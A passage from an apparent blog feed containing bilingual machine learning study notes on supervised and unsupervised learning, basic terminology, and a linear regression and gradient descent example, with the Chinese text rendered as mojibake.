ä»»åŠ¡å¯å¤§è‡´åˆ’åˆ†ä¸ºä¸¤å¤§ç±»ï¼šâ€œç›‘ç£å­¦ä¹ â€ï¼ˆsupervisedlearningï¼‰å’Œâ€œæ— ç›‘ç£å­¦ä¹ â€ï¼ˆunsupervisedlearningï¼‰ï¼Œåˆ†ç±»å’Œå›å½’æ˜¯å‰è€…çš„ä»£è¡¨ï¼Œè€Œèšç±»åˆ™æ˜¯åè€…çš„ä»£è¡¨.</p><ol type="1"><li>Supervised learning Teach the computer how to do something</li><li>Unsupervised learning Let it learning by itself</li></ol><p>Others:</p><ul><li>Reinforcement learning</li><li>Recommender systems</li></ul><p>The classification of Supervised Learning and Unsupervised Learningare based on the forms of the data you get.</p><h3 id="supervised-learning">Supervised learning</h3><p>Give the algorithm a data set in which the "right answer" ï¼ˆlabelï¼‰were given. The task of the algorithm is to learn to produce more ofthis right answer througth learning the given data set.</p><p>ç»™å®šæœ‰æ ‡ç­¾çš„æ•°æ®é›†ï¼Œé€šè¿‡å®ƒå­¦ä¹ è¾“å…¥ä¸è¾“å‡ºçš„å¯¹åº”å…³ç³»ã€‚å°±åƒåˆ·é¢˜ä¸€æ ·ï¼Œè‡ªå·±åšé¢˜ï¼Œç„¶åæ ¹æ®ç»™çš„ç­”æ¡ˆï¼ˆlabelï¼‰æ¥ä¸æ–­è°ƒæ•´è‡ªå·±çš„æ–¹æ³•å’Œæ€è·¯ï¼Œæœ€ç»ˆä½œå‡ºæ­£ç¡®ç­”æ¡ˆã€‚</p><p>ç›‘ç£å­¦ä¹ ç›®å‰ä½¿ç”¨è¾ƒä¸ºå¹¿æ³›ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼š</p><ol type="1"><li><p>Regression problem</p><p>é¢„æµ‹è¿ç»­çš„è¾“å‡ºå€¼ï¼ˆä¾‹å¦‚ï¼šä»·æ ¼ã€é«˜åº¦ã€æ—¶é—´ç­‰ï¼‰æ ¹æ®æ•°æ®æ ·æœ¬ä¸ŠæŠ½å–çš„ç‰¹å¾ï¼Œé¢„æµ‹è¿ç»­å€¼ç»“æœï¼Œå¦‚ï¼šæˆ¿ä»·å¤šå°‘ï¼Œå¾—åˆ†å¤šå°‘ï¼ŒGDPå¤šå°‘</p><p>å›å½’é—®é¢˜æ˜¯åœ¨åšè®¡ç®—é¢˜</p></li><li><p>Classification problem</p><p>é¢„æµ‹<strong>ç¦»æ•£</strong>çš„è¾“å‡ºå€¼ï¼ˆä¾‹å¦‚ï¼šå¯¹é”™ã€å¥½åã€aã€b æˆ– c ç­‰ï¼‰æ ¹æ®æ•°æ®æ ·æœ¬ä¸ŠæŠ½å–å‡ºçš„ç‰¹å¾ï¼Œåˆ¤å®šå…¶å±äºæœ‰é™ä¸ªç±»åˆ«ä¸­çš„å“ªä¸€ä¸ªï¼Œæ¯”å¦‚ï¼šåƒåœ¾é‚®ä»¶è¯†åˆ«ï¼ˆç»“æœç±»åˆ«ï¼šyesornoï¼‰ï¼Œæ–‡æœ¬æƒ…æ„Ÿè¤’è´¬è¯†åˆ«ï¼ˆç»“æœç±»åˆ«ï¼šè¤’ã€è´¬ï¼‰ï¼Œå›¾åƒå†…å®¹è¯†åˆ«ï¼ˆç»“æœç±»åˆ«ï¼šçŒ«ï¼Œç‹—ï¼Œäººï¼Œå…¶ä»–ï¼‰</p><p>åˆ†ç±»é—®é¢˜æ˜¯åœ¨åšé€‰æ‹©é¢˜</p><p>æ³¨: é€»è¾‘å›å½’å®é™…ä¸Šæ˜¯åˆ†ç±»é—®é¢˜</p></li></ol><h3 id="unsupervised-learning">Unsupervised learning</h3><p>Weâ€˜re given data that looks different, and doesn't havs any labels orthat all have the same label or really no labels. We expect the modelfind some structure in the data.</p><p>ç»™å®šæ•°æ®é›†ï¼Œæ²¡æœ‰æ ‡ç­¾ï¼Œé€šè¿‡ç¨‹åºè‡ªå·±å»æŒ–æ˜æ•°æ®å…·æœ‰çš„ç‰¹å¾ï¼Œä»è€Œå­¦å¾—æ¨¡å‹ã€‚</p><p>æ— ç›‘ç£å­¦ä¹ ä¸»è¦ä»¥èšç±»é—®é¢˜ä¸ºä¸»</p><ol type="1"><li><p>Clustering algorithm</p><p>Break the data into some kinds of separate clusters (such as googlenew sort tons of informations into separate clustersã€Organize computingclustersã€Social network analysisã€Market segmentationã€Astronomicaldata analysis etc)</p><p>èšç±»ç®—æ³•ï¼šå°†æ•°æ®åˆ†æˆå‡ ç±»ï¼Œæ ¹æ®æ•°æ®æ ·æœ¬æŠ½å–å‡ºçš„ç‰¹å¾ï¼ŒæŒ–æ˜æ•°æ®çš„å…³è”ã€èšåˆæ¨¡å¼ã€‚</p></li><li><p>Cocktail party problem</p><p>Separate the different things from different sources</p></li></ol><h3 id="semi-supervised-learning">Semi-Supervised Learning</h3><p>Semi-supervised learning falls between unsupervised learning (with nolabeled training data) and supervised learning (with only labeledtraining data). It combines a small amount of labeled data with a largeamount of unlabeled data during training.</p><h3 id="reinforcement-learning">Reinforcement learning</h3><p>å¼ºåŒ–å­¦ä¹ æ˜¯ä»ç¯å¢ƒåˆ°è¡Œä¸ºæ˜ å°„çš„å­¦ä¹ ï¼Œå®ƒç ”ç©¶åŸºäºç¯å¢ƒè€Œè¡ŒåŠ¨ï¼Œä»¥å–å¾—æœ€å¤§åŒ–çš„é¢„æœŸæ”¶ç›Šï¼Œä¾‹å¦‚ï¼šæ¸¸æˆå¦‚ä½•å¾—æœ€é«˜åˆ†ï¼Œæœºå™¨äººå®Œæˆä»»åŠ¡ã€‚</p><h2 id="åŸºæœ¬æ¦‚å¿µæœ¯è¯­">åŸºæœ¬æ¦‚å¿µæœ¯è¯­</h2><p>ä¸‹é¢ä»¥ä½¿ç”¨èŒƒå›´è¾ƒå¹¿çš„ç›‘ç£å­¦ä¹ ä¸ºä¾‹å­ï¼Œä»‹ç»æœºå™¨å­¦ä¹ çš„æ¦‚å¿µ</p><p>æ•°æ®é›†</p><ul><li>è®­ç»ƒé›† æœ‰æ­£ç¡®ç­”æ¡ˆçš„ï¼Œè¢«æ ‡è®°çš„ï¼Œç”¨æ¥å­¦ä¹ ï¼Œå½’çº³çš„æ•°æ®é›†ã€‚</li><li>æµ‹è¯•é›† æ²¡æœ‰æ­£ç¡®ç­”æ¡ˆçš„ï¼Œæ²¡æœ‰æ ‡è®°çš„ï¼Œç”¨æ¥æµ‹è¯•æ¨¡å‹çš„ä¼˜åŠ£çš„æ•°æ®é›†ã€‚</li></ul><p>å¯¹äºéç›‘ç£å­¦ä¹ ï¼Œè®­ç»ƒé›†å’Œæµ‹è¯•é›†å°±æ²¡ä¸ä»€ä¹ˆåŒºåˆ«äº†ï¼Œåªæ˜¯ä½¿ç”¨æ—¶çš„ç›®çš„ä¸ä¸€æ ·è€Œå·²ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16132680505121.jpg"alt="16132680505121" /><figcaption aria-hidden="true">16132680505121</figcaption></figure><p>ä¸Šå›¾ä¸­æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå«åšä¸€ä¸ªç¤ºä¾‹ï¼ˆinstanceï¼‰ã€æ ·ä¾‹ï¼ˆexampleï¼‰ã€æ ·æœ¬ï¼ˆsampleï¼‰</p><p>å‰ä¸‰åˆ—æ¯ä¸€åˆ—çš„è¡¨å¤´å«åšï¼šå±æ€§ï¼ˆattributeï¼‰ã€ç‰¹å¾ï¼ˆfeatureï¼‰</p><p>æ¯ä¸ªæ ·æœ¬çš„æ¯ä¸€åˆ—ä¸Šçš„å€¼å«åšï¼šå±æ€§å€¼ã€ç‰¹å¾å€¼</p><p>æ‰€æœ‰çš„å±æ€§æ„æˆä¸€ä¸ªå±æ€§ç©ºé—´ï¼Œæ‰€æœ‰çš„æ ·æœ¬æ„æˆä¸€ä¸ªæ ·æœ¬ç©ºé—´ï¼Œè¾“å…¥â€˜Xâ€™å¯èƒ½å–å€¼çš„é›†åˆå°±æ˜¯è¾“å…¥ç©ºé—´ï¼ˆinputspaceï¼‰</p><p>å±æ€§å‘é‡ï¼šæ¯ä¸€ä¸ªå±æ€§æœ‰ä¸€ä¸ªåˆ—å‘é‡ï¼Œè¿™äº›åˆ—å‘é‡æ„å»º: [x1,x2,..xn]æˆä¸ºä¸€ä¸ªç‰¹å¾å‘é‡</p><p>æœºå™¨å­¦ä¹ çš„æ•´ä¸ªæµç¨‹ï¼šæ ¹æ®æ•°æ®çš„ç±»å‹ï¼Œç‰¹ç‚¹ç­‰ï¼Œé‡‡ç”¨ä¸åŒå­¦ä¹ æ–¹æ³•ï¼ˆç›‘ç£ä¸æ— ç›‘ç£ï¼‰ä¸­ä¸åŒçš„å­¦ä¹ ç®—æ³•ï¼ˆlearningalgorithmï¼‰æ¥è¿›è¡Œè®­ç»ƒï¼Œä»è€Œå¾—åˆ°ä¸€ä¸ªæ¨¡å‹ï¼Œç„¶åå¯¹è¿™ä¸ªæ¨¡å‹è¿›è¡Œæµ‹è¯•ï¼Œç„¶åæ”¹è¿›ã€è¿­ä»£ã€‚</p><p>æ¨¡å‹/å‡è®¾(hypothesis)/å­¦ä¹ å™¨(learner):ä¼°è®¡å‡½æ•°ï¼Œå¯¹è§„å¾‹å’Œæ¨¡å¼çš„é¢„æµ‹å­¦ä¹ æœºï¼ˆlearnerï¼‰ï¼šä½¿ç”¨çš„å­¦ä¹ ç®—æ³• çœŸç›¸ï¼ˆground-truthï¼‰ï¼šæ ‡ç­¾ã€æ ‡å‡†ç­”æ¡ˆæ ·æœ¬ï¼ˆsampleï¼‰ =å±æ€§ï¼ˆattributeï¼‰/ç‰¹å¾ï¼ˆfeatureï¼‰+æ ‡è®°/æ ‡ç­¾ï¼ˆlabelï¼‰</p><p>æ³›åŒ–èƒ½åŠ›ï¼šæ¨¡å‹é€‚ç”¨äºæ–°æ ·æœ¬çš„èƒ½åŠ›ï¼Œç§°ä¸ºâ€œæ³›åŒ–â€ï¼ˆgeneralizationï¼‰èƒ½åŠ›ï¼Œå…·æœ‰å¼ºæ³›åŒ–èƒ½åŠ›çš„æ¨¡å‹èƒ½å¾ˆå¥½åœ°é€‚ç”¨äºæ•´ä¸ªæ ·æœ¬ç©ºé—´ï¼Œäºæ˜¯ï¼Œå°½ç®¡è®­ç»ƒé›†é€šå¸¸åªæ˜¯æ ·æœ¬ç©ºé—´çš„ä¸€ä¸ªå¾ˆå°çš„é‡‡æ ·ï¼Œæˆ‘ä»¬ä»å¸Œæœ›å®ƒèƒ½å¾ˆå¥½åœ°åæ˜ å‡ºæ ·æœ¬ç©ºé—´çš„ç‰¹æ€§ã€‚</p><p>å½’çº³åå¥½ï¼šæœºå™¨å­¦ä¹ ç®—æ³•åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­å¯¹æŸç§ç±»å‹å‡è®¾çš„åå¥½ï¼Œç§°ä¸ºâ€œå½’çº³åå¥½â€ï¼ˆinductivebiasï¼‰ï¼Œæˆ–ç®€ç§°ä¸ºâ€œåå¥½â€ â€œå¥¥å¡å§†å‰ƒåˆ€â€ï¼ˆOccam'srazorï¼‰æ˜¯ä¸€ç§å¸¸ç”¨çš„ã€è‡ªç„¶ç§‘å­¦ç ”ç©¶ä¸­æœ€åŸºæœ¬çš„åŸåˆ™ï¼Œå³â€œè‹¥æœ‰å¤šä¸ªå‡è®¾ä¸è§‚å¯Ÿä¸€è‡´ï¼Œåˆ™é€‰æœ€ç®€å•çš„é‚£ä¸ªâ€</p><h2 id="ä¹¦ç±èµ„æ–™">ä¹¦ç±èµ„æ–™</h2><ol type="1"><li>Prof Andrew Ng Machine Learning. Stanford University</li><li>å‘¨å¿—åï¼Œæœºå™¨å­¦ä¹ ï¼Œæ¸…åå¤§å­¦å‡ºç‰ˆç¤¾ï¼Œ2016</li><li>Python æ•°æ®åˆ†æä¸æŒ–æ˜å®æˆ˜</li><li>é¢å‘æœºå™¨æ™ºèƒ½çš„ tensorflow å®è·µ</li><li>æœºå™¨å­¦ä¹ ç³»ç»Ÿè®¾è®¡</li><li>tensorflow æŠ€æœ¯è§£æä¸å®æˆ˜</li><li><ahref="http://scikit-learn.org/stable/index.html">Scikit-learn</a></li><li><ahref="https://developers.google.com/machine-learning/crash-course">GoogleCrash-Course</a></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><a href="https://www.coursera.org/learn/machine-learning">MachineLearning by Stanford University | Coursera</a></li><li><ahref="https://cs.nju.edu.cn/zhouzh/zhouzh.files/publication/MLbook2016.htm">å‘¨å¿—åæœºå™¨å­¦ä¹ </a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æœºå™¨å­¦ä¹ åŸºæœ¬æ¦‚å¿µ</title>
      <link href="/blog/2021/07/15/ml/1.intro_regression/"/>
      <url>/blog/2021/07/15/ml/1.intro_regression/</url>
      
        <content type="html"><![CDATA[<h2 id="æœºå™¨å­¦ä¹ machine-learningå®šä¹‰">æœºå™¨å­¦ä¹ ï¼ˆMachineLearningï¼‰å®šä¹‰</h2><p>æœºå™¨å­¦ä¹ çš„æœ¬è´¨å°±æ˜¯å¯»æ‰¾ä¸€ä¸ªå‡½æ•° functionï¼Œæ¥å¯»æ‰¾ä¸€ä¸ªè¾“å…¥ input ä¸è¾“å‡ºoutput ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚</p><h2 id="æœºå™¨å­¦ä¹ çš„åº”ç”¨">æœºå™¨å­¦ä¹ çš„åº”ç”¨</h2><table><colgroup><col style="width: 20%" /><col style="width: 37%" /><col style="width: 41%" /></colgroup><thead><tr class="header"><th>åœºæ™¯</th><th>å‡½æ•°/é¢„æµ‹</th><th></th></tr></thead><tbody><tr class="odd"><td>Speech Recognition</td><td>f(ä¸€æ®µè¯­éŸ³)=æ–‡å­—</td><td>è¾“å…¥å£°éŸ³ï¼Œè¾“å‡ºè¯­éŸ³å†…å®¹</td></tr><tr class="even"><td>Image Recognition</td><td>f(å›¾ç‰‡)=å¯¹è±¡</td><td>è¾“å…¥å›¾åƒï¼Œè¾“å‡ºå›¾åƒå¯¹è±¡çš„æè¿°</td></tr><tr class="odd"><td>Playing Go</td><td>f(æ£‹ç›˜) = ä¸‹æ£‹å­çš„ä½ç½®</td><td>ä¸‹æ£‹å­çš„ä½ç½®, è¾“å‡ºä¸‹ä¸€æ­¥æ£‹ next move</td></tr><tr class="even"><td>Self-driving Car</td><td>f(å„ç§ä¼ æ„Ÿå™¨å‚æ•°) = æ–¹å‘ç›˜è§’åº¦</td><td>æ ¹æ®å¯¹é“è·¯ä»¥åŠè·¯éšœçš„è¯†åˆ«ï¼Œå¾—å‡ºæ–¹å‘</td></tr><tr class="odd"><td>Recommendation</td><td>fï¼ˆä½¿ç”¨è€… Aï¼Œ å•†å“ Bï¼‰=è´­ä¹°å¯èƒ½æ€§</td><td>æ ¹æ®ç”¨æˆ·ä¸å•†å“çš„å…³ç³»ï¼Œå¾—å‡ºè´­ä¹°å¯èƒ½æ€§</td></tr></tbody></table><h2 id="åŸºæœ¬æ¦‚å¿µ">åŸºæœ¬æ¦‚å¿µ</h2><p>å›å½’ regressionï¼šThe function outputs a scalar(æ ‡é‡æ•°å€¼)</p><p>åˆ†ç±» classificationï¼šGive option(classes),the function outputs thecorrect one.</p><p>ç»“æ„åŒ–å­¦ä¹  structures Learningï¼šcreate something withstructure(image,document). å‡½æ•°è¾“å‡ºæ˜¯ä»¥æŸç§ç»“æ„å½¢å¼ã€‚</p><p>æ‰“ä¸ªæ¯”å–»ï¼Œå¦‚æœç”¨ä¸€å¼ æ•°å­¦è¯•å·æ¥æè¿°ï¼Œåˆ†ç±»æ˜¯ç»™å®šé€‰é¡¹çš„ï¼Œåƒåˆ¤æ–­é¢˜å°±æ˜¯äºŒåˆ†ç±»é—®é¢˜ï¼Œç ”ç©¶å¯¹è±¡æ˜¯ä¸æ˜¯è¿™ä¸ªç±»çš„é—®é¢˜ï¼Œè€Œé€‰æ‹©é¢˜å°±æ˜¯å¤šåˆ†ç±»é—®é¢˜ï¼Œæœ‰å¤šä¸ªç±»åˆ«é€‰æ‹©ä¸€ä¸ªç±»åˆ«ï¼›å›å½’æ›´åƒæ˜¯ç®€ç­”é¢˜ï¼Œä½ çš„è‡ªå·±ç®—å‡ºæ ‡é‡å€¼ï¼›è€Œç»“æ„åŒ–å­¦ä¹ å¯ä»¥æ˜¯ä¸€æ•´å¼ è¯•å·ï¼Œä¹Ÿå¯ä»¥æ˜¯è¯•å·çš„æ‰€æœ‰é€‰æ‹©é¢˜æˆ–æ‰€æœ‰ç®€ç­”é¢˜ã€‚é‚£å¦‚æœæ˜¯å¤šé€‰é¢˜å‘¢ï¼Ÿå¤šä¸ªé€‰é¡¹å¤šä¸ªæ­£ç¡®ç­”æ¡ˆï¼Œä¾‹å¦‚ä¸€å¼ æ €å­èŠ±å›¾ç‰‡ï¼ˆå›¾ä»ç™¾åº¦ä¸Šå€Ÿæ¥ï¼‰ï¼Œå®ƒæ—¢å±äºèŠ±ç±»ï¼Œä¹Ÿå±äºæ €å­èŠ±ç±»ã€‚å…¶å®ä¹Ÿæ²¡äº‹ï¼Œè®¾ç½®å¤šæ ‡ç­¾multi-labelã€‚</p><h2 id="how-to-find-function">How to find Function?</h2><p>Case Study</p><h3 id="function-with-unknown-parameters">Function with unknownParameters</h3><p>æ¨¡å‹å­¦ä¹ çš„ä¸‰æ­¥éª¤ï¼šå»ºç«‹æ¨¡å‹ã€å®šä¹‰æŸå¤±å‡½æ•°ã€ä¼˜åŒ–å‚æ•°</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422004647.png"alt="20220422004647" /><figcaption aria-hidden="true">20220422004647</figcaption></figure><ol type="1"><li>æ ¹æ® domain knowledge<a href="#fn1" class="footnote-ref" id="fnref1"role="doc-noteref"><sup>1</sup></a>ï¼ŒçŒœæµ‹ä¸€ä¸ªèƒ½å®Œæˆä»»åŠ¡çš„æœªçŸ¥å‡½æ•°</li><li>æ ¹æ®è®­ç»ƒæ•°æ®ï¼Œå®šä¹‰ loss å‡½æ•°ï¼Œç”¨æ¥è¡¡é‡å‡½æ•°è§£å’ŒçœŸå®æƒ…å†µçš„å·®è·ã€‚</li><li>é€šè¿‡ä¸æ–­ä¼˜åŒ–ï¼Œæ‰¾åˆ°èƒ½ä½¿ losså€¼æœ€å°çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä½¿å‡½æ•°è§£å°½å¯èƒ½æ¥è¿‘çœŸå®æƒ…å†µã€‚</li></ol><p>è¿™ä¸‰æ­¥éƒ½å±äº training è¿‡ç¨‹ã€‚æœ€å trainå‡ºæ¥çš„å‚æ•°èƒ½ä½¿æ¨¡å‹é¢„æµ‹æœ€å‡†ï¼Œå°†è¿™ä¸ªæ¨¡å‹ç”¨äºé¢„æµ‹æ²¡æœ‰çœ‹è¿‡çš„èµ„æ–™çš„è¿‡ç¨‹å«åštestingï¼Œä¸€èˆ¬ testing çš„ loss ä¼šæ¯” training çš„ loss é«˜ã€‚</p><h4 id="regressionå›å½’">Regressionï¼ˆå›å½’ï¼‰</h4><p>ä¸‹é¢ä»¥é¢„æµ‹ YouTubeé¢‘é“æ¬¡æ—¥æµé‡ä¸ºä¾‹ï¼Œè®²ä¸€ä¸ªå›å½’ä»»åŠ¡çš„æµç¨‹ã€‚åŸºäºåå°èµ„è®¯ï¼ˆdomainknowledgeï¼‰ï¼Œæˆ‘ä»¬çŒœæµ‹ä¸€ä¸ªå¸¦æœ‰æœªçŸ¥æ•°çš„æ¨¡å‹ã€‚y æ˜¯é¢„æµ‹çš„è§‚çœ‹é‡ï¼›x1æ˜¯ä»Šå¤©çš„è§‚çœ‹é‡ï¼Œç§°ä¸º featureï¼ˆè‡ªå˜é‡ï¼‰ï¼›w å’Œ bå°±æ˜¯æ¨¡å‹å‚æ•°ï¼Œéœ€è¦å­¦ä¹ ä¹‹åç¡®å®šä¸‹æ¥ã€‚</p><ol type="1"><li><p>ç¬¬ä¸€æ­¥ï¼šå»ºç«‹ä¸€ä¸ªå«æœ‰æœªçŸ¥å‚æ•°çš„å‡½æ•°ï¼Œä»è€Œè§„å®šä¸€ç±»å‡½æ•°é›†åˆï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯æœºå™¨å­¦ä¹ é‡Œçš„æ¨¡å‹modelã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220421230745.png"alt="20220421230745" /> æ ¹æ® domain knowledge<a href="#fn2"class="footnote-ref" id="fnref2"role="doc-noteref"><sup>2</sup></a>ï¼ŒçŒœæµ‹ä¸€ä¸ªèƒ½å®Œæˆä»»åŠ¡çš„æœªçŸ¥å‡½æ•°ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬çŒœæµ‹ï¼š<spanclass="math inline">\(y=b+w*x_1\)</span>ã€‚<spanclass="math inline">\(x\)</span> æ˜¯å·²çŸ¥çš„ç‰¹å¾ featureï¼Œ<spanclass="math inline">\(w\)</span> ä¸ºæƒé‡ weightï¼Œ<spanclass="math inline">\(b\)</span> æ˜¯åç½® bias, <spanclass="math inline">\(w\)</span>å’Œ<spanclass="math inline">\(b\)</span>éƒ½æ˜¯æœªçŸ¥çš„å‚æ•°ï¼Œéœ€è¦ä»æ•°æ®ä¸­å­¦ä¹ ã€‚</p></li><li><p>Define loss from Training data</p><p>è¦è¯„ä»· function/model çš„å¥½åï¼Œå°±éœ€è¦å®šä¹‰è¯„ä¼° modelçš„å‡½æ•°ï¼Œå³å®šä¹‰æŸå¤±ï¼ˆlossï¼‰å‡½æ•°ï¼Œè®¡ç®— modelåœ¨æ‰€æœ‰æ ·æœ¬ç‚¹ä¸Šçš„æŸå¤±æ€»å’Œã€‚<strong>Lossæ˜¯å…³äºæœªçŸ¥å‚æ•°çš„å‡½æ•°</strong>ï¼Œæ¯ä¸€å¯¹æœªçŸ¥å‚æ•°çš„å…·ä½“å€¼ <spanclass="math inline">\((w_1, b_1)\)</span>ï¼Œå¯¹åº”ä¸€ä¸ªé¢„æµ‹æ¨¡å‹ï¼ŒLosså‡½æ•°å³æ˜¯è¯„ä¼°è¯¥é¢„æµ‹æ¨¡å‹å’ŒçœŸå®æ¨¡å‹(è®­ç»ƒæ•°æ®)çš„æ‹Ÿåˆç¨‹åº¦(æŸå¤±/å·®å€¼)ã€‚ä»è€Œé€šè¿‡å˜æ¢<span class="math inline">\(w\)</span> å’Œ <spanclass="math inline">\(b\)</span> æœ€å°åŒ– Losså€¼ï¼Œå°±æ˜¯ä¸æ–­è°ƒæ•´é¢„æµ‹æ¨¡å‹æ¥æ‹Ÿåˆè®­ç»ƒæ•°æ®ã€‚è¯„ä»·ä¸€ä¸ªé¢„æµ‹æ¨¡å‹çš„å¥½åï¼Œå³ï¼šå¯¹æ¯ä¸€ä¸ªè®­ç»ƒæ ·æœ¬ï¼Œè®¡ç®—å…¶æ¨¡å‹è¾“å‡ºä¸çœŸå®å€¼ï¼ˆlabelï¼‰ä¹‹é—´çš„è¯¯å·®ï¼ˆeï¼‰ï¼Œä¹Ÿå°±æ˜¯æŸå¤±ï¼Œæ•´ä¸ªæ¨¡å‹çš„æŸå¤±å‡½æ•°å°±æ˜¯å…¨éƒ¨è®­ç»ƒæ ·æœ¬è¯¯å·®çš„å¹³å‡å€¼ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220421233122.png"alt="20220421233122" /><figcaption aria-hidden="true">20220421233122</figcaption></figure><p>loss å¸¸ç”¨çš„è¯„ä¼°æ–¹å¼æœ‰ï¼š</p><ul><li><p>MAE(mean absolute error) å¹³å‡ç»å¯¹è¯¯å·®</p></li><li><p>MSEï¼ˆmean square errorï¼‰ å‡æ–¹è¯¯å·®</p></li><li><p>cross-Entropy äº¤å‰ç†µ</p><p>If y and are both probability distributionsï¼Œåˆ™é€‰æ‹©Cross-entropy</p></li></ul><p>Error Surface è¯¯å·®æ›²é¢ï¼šç»˜åˆ¶å‡ºå‚æ•°ä½œä¸ºæ¨ªã€çºµåæ ‡å’Œ Lä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œå°±å½¢æˆäº†äºŒç»´çš„è¯¯å·®é¢ï¼Œé¢œè‰²ä»£è¡¨ loss çš„å¤§å°ã€‚ <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220421234522.png"alt="20220421234522" /></p></li><li><p>Optimization</p></li></ol><p>ä¼˜åŒ–çš„ç›®æ ‡æ˜¯æ‰¾åˆ°ä½¿ Loss æœ€å°çš„å‚æ•°ï¼Œå³æ±‚è§£<spanclass="math inline">\(w^{*}, b^{*}=\underset{w, b}{\arg \min }L\)</span></p><p>ä¼˜åŒ–æ–¹æ³•ï¼šæ¢¯åº¦ä¸‹é™ gradient descend</p><p>ä¸€ã€ä»¥ä¸€ä¸ªå‚æ•° <span class="math inline">\(w\)</span>ä¸¾ä¾‹ï¼Œç”»å‡ºå…¶å¯¹åº”çš„ error surface</p><pre><code>ä¸‹é¢ä¾‹å­ä¸­å…ˆä¸çœ‹å‚æ•° bï¼Œåªè§‚å¯Ÿå‚æ•° wã€‚æ¢¯åº¦ä¸‹é™çš„åšæ³•æ˜¯å…ˆéšæœºåˆå§‹åŒ–ä¸€ä¸ª w0ï¼Œç„¶åè®¡ç®— w0 å¤„çš„å¾®åˆ†ï¼Œå¯ç†è§£ä¸ºæ–œç‡ã€‚å½“å¾®åˆ†ä¸ºè´Ÿæ•°æ—¶ï¼Œåœ¨ w0 å¤„ï¼Œloss å…³äº w é€’å‡ï¼Œæ‰€ä»¥å¢å¤§ w ä½¿ loss ä¸‹é™ã€‚å½“å¾®åˆ†ä¸ºæ­£æ•°æ—¶ï¼Œåœ¨ w0 å¤„ï¼Œloss å…³äº w é€’å¢ï¼Œæ‰€ä»¥å‡å° w ä½¿ loss ä¸‹é™ã€‚![20220422003305](https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422003305.png)å…ˆéšä¾¿é€‰ä¸ª $w$ï¼Œç„¶åè®¡ç®—å®ƒçš„æ¢¯åº¦ï¼ˆä¹Ÿå°±æ˜¯æ–œç‡ï¼‰ï¼Œå½“æ¢¯åº¦ä¸ºè´Ÿæ—¶å°±åº”å¢å¤§ $w$ã€‚å¢å¤§ x çš„å¹…åº¦ï¼ˆæ­¥é•¿ï¼‰ç”±å­¦ä¹ ç‡ learning rate å’Œæ–œç‡å†³å®šã€‚å­¦ä¹ ç‡æ˜¯ä¸€ä¸ªéœ€è¦æå‰è®¾å®šçš„è¶…å‚æ•° hyperparameterï¼ˆç›¸æ¯”è¶…å‚è€Œè¨€ï¼Œ$w$å’Œ $b$ è¿™ç§å‚æ•°æ˜¯è¦é€šè¿‡æ•°æ®å­¦ä¹ çš„ï¼‰å¦‚æ­¤è¿­ä»£å¤šæ¬¡æ›´æ–° $w$ï¼ˆåœæ­¢æ¡ä»¶ï¼šè¿­ä»£æ¬¡æ•°è¾¾åˆ°é˜ˆå€¼ï¼ˆè¶…å‚ï¼‰æˆ–å¾®åˆ†è¶‹äº 0ï¼‰,æ¢¯åº¦ä¸‹é™çš„é—®é¢˜åœ¨äºåªèƒ½æ‰¾åˆ°å±€éƒ¨æœ€å°å€¼ï¼ˆä½†å…¶å®è¿™æ˜¯ä¸ªå‡é—®é¢˜ï¼Œå°†åœ¨åé¢è¯¾ç¨‹ä¸­è§£é‡Šï¼‰![20220422003846](https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422003846.png)</code></pre><p>äºŒã€æ¨å¹¿åˆ°ä¸¤ä¸ªå‚æ•°çš„ä¾‹å­ï¼šéšæœºé€‰å–åˆå§‹å‚æ•°ï¼Œè®¡ç®—å…¶åå¾®åˆ†ï¼Œä½¿ç”¨æ¢¯åº¦ä¸‹é™çš„æ–¹å¼åŒæ—¶æ›´æ–°ä¸¤ä¸ªå‚æ•°ï¼Œå¤šæ¬¡è¿­ä»£ç›´è‡³åœæ­¢ã€‚</p><pre><code>![20220422004135](https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422004135.png)![20220422004234](https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422004234.png)</code></pre><ol start="4" type="1"><li><p>æµ‹è¯•</p><p>é€šè¿‡è®­ç»ƒé˜¶æ®µå¾—åˆ° <span class="math inline">\(w^{*}=0.97, b^{*}=0.1k\)</span> ï¼Œè®­ç»ƒé›†ä¸Šçš„æŸå¤±å‡½æ•° <spanclass="math inline">\(L\left(w^{*}, b^{*}\right)=0.48 k\)</span>ï¼Œæµ‹è¯•é›†ä¸Šçš„æŸå¤±å‡½æ•° <span class="math inline">\(L^{\prime}=0.58k\)</span> a <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422004748.png"alt="20220422004748" />é€šè¿‡ä¸Šå›¾çœŸå®å€¼å’Œæ‹Ÿåˆå€¼å¯¹æ¯”ï¼Œå¯ä»¥çœ‹å‡ºæ•°æ®æœ‰æ˜æ˜¾çš„å‘¨æœŸæ€§ï¼Œå› æ­¤ä¿®æ”¹è‡ªå˜é‡ä¸ºå‰j æ—¥çš„æµé‡ã€‚æ‹Ÿåˆ 1 æ—¥ã€7 æ—¥ã€28 æ—¥ã€56æ—¥çš„æ•°æ®æ¥é¢„æµ‹ä¸‹ä¸€æ—¥æµé‡ã€‚å¯ä»¥å‘ç°éšç€è‡ªå˜é‡æ—¥æœŸå¢åŠ 